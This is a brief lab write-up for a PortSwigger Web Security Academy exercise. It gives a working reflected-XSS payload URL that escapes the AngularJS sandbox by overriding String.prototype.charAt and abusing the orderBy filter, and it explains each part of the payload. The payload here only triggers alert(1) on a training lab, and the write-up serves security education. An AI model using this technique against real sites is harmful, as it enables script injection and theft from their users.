# Reflected XSS with AngularJS sandbox escape without strings

[link](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)

```
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

url decode ->

```
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

`search=1&` -> to satisfy the search query

`toString().constructor.prototype.charAt=[].join;` -> overrides the default charAt method on the String prototype to bypass AngularJS sandbox protections

`[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` -> uses the AngularJS orderBy filter to force evaluation of a malicious expression, resulting in JavaScript execution
